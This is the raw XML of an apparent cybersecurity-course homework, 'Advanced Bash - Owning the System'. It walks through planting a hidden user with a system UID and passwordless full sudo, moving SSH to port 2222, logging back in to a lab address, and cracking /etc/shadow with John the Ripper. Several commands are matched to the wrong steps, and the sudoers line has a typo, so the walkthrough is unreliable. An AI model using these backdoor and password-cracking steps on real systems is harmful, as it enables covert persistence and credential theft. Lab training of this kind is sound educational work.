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0df661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094e61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094e61" officeooo:paragraph-rsid="00094e61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officeooo:rsid="000ad467" officeooo:paragraph-rsid="000ad467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officeooo:rsid="000d4039" officeooo:paragraph-rsid="000d4039"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00094e61"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="000c29ad"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in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4e61"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="000c29ad"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00094e61"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="000df661"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="000df661" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="000df661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user-content-week-6-homework-advanced-bash-owning-the-system"/><text:span text:style-name="Strong_20_Emphasis">Week 6 Homework: Advanced Bash - Owning the System </text:span></text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis"/></text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Step 1: Shadow People</text:span></text:p>
      <text:list xml:id="list1840908108" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Create a secret user named <text:span text:style-name="Source_20_Text">sysd</text:span>. Make sure this user doesn't have a home folder created:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">sudo passwd sysd</text:span></text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P1">Give your secret user a password:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P10">sudo usermod -u 400 sysd</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P1">Give your secret user a system UID &lt; 1000:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P6"><text:span text:style-name="T4">sudo groupmod -g 700 sysd</text:span> </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P1">Give your secret user the same GID:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P6"><text:span text:style-name="T4">visudo</text:span> </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P1">Give your secret user full <text:span text:style-name="Source_20_Text">sudo</text:span> access without the need for a password:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P6"><text:s/><text:span text:style-name="T4">sysd ALL=(ALL:LL) NOPASSWD:ALL</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P1">Test that <text:span text:style-name="Source_20_Text">sudo</text:span> access works without your password:</text:p>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">sudo -l</text:span></text:span></text:p>
          <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">sudo apt update</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Step 2: Smooth Sailing</text:span></text:p>
      <text:list xml:id="list1668761291" text:style-name="L2">
        <text:list-header>
          <text:p text:style-name="P2">Edit the <text:span text:style-name="Source_20_Text">sshd_config</text:span> file:</text:p>
          <text:p text:style-name="P15"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1"># default value.</text:span></text:span></text:p>
          <text:p text:style-name="P15"/>
          <text:p text:style-name="P15">#Port 22</text:p>
          <text:p text:style-name="P15">#Port 2222</text:p>
          <text:p text:style-name="P15">#AddressFamily any</text:p>
          <text:p text:style-name="P15">#ListenAddress 0.0.0.0</text:p>
          <text:p text:style-name="P15">#ListenAddress ::</text:p>
        </text:list-header>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Step 3: Testing Your Configuration Update</text:span></text:p>
      <text:list xml:id="list2884690093" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P3">Restart the SSH service:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P11">systemctl restart ssh</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3">Exit the <text:span text:style-name="Source_20_Text">root</text:span> account:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P12">logout or exit</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:soft-page-break/>SSH to the target machine using your <text:span text:style-name="Source_20_Text">sysd</text:span> account and port <text:span text:style-name="Source_20_Text">2222</text:span>:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text">ssh sysd@192.168.6.105 -p 2222 </text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3">Use <text:span text:style-name="Source_20_Text">sudo</text:span> to switch to the root user:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P3">sudo su - </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Step 4: Crack All the Passwords</text:span></text:p>
      <text:list xml:id="list3590204823" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P4">SSH back to the system using your <text:span text:style-name="Source_20_Text">sysd</text:span> account and port <text:span text:style-name="Source_20_Text">2222</text:span>:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P9">ssh sysd@192.168.6.105 -p 2222 </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">Escalate your privileges to the <text:span text:style-name="Source_20_Text">root</text:span> user. Use John to crack the entire <text:span text:style-name="Source_20_Text">/etc/shadow</text:span> file:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">sudo -</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">s</text:span></text:span></text:p>
              <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">john </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">/etc/shadow</text:span></text:span></text:p>
              <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">john -show /etc/shadow</text:span></text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">See attached image for details</text:span>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16:33:47.155000000</meta:creation-date>
    <dc:date>2021-08-04T17:53:45.572000000</dc:date>
    <meta:editing-duration>PT19M5S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="40" meta:word-count="237" meta:character-count="1244" meta:non-whitespace-character-count="1066"/>
    <meta:generator>LibreOffice/5.4.2.2$Windows_X86_64 LibreOffice_project/22b09f6418e8c2d508a9eaf86b2399209b0990f4</meta:generator>
  </office:meta>
</office:document-meta>
</file>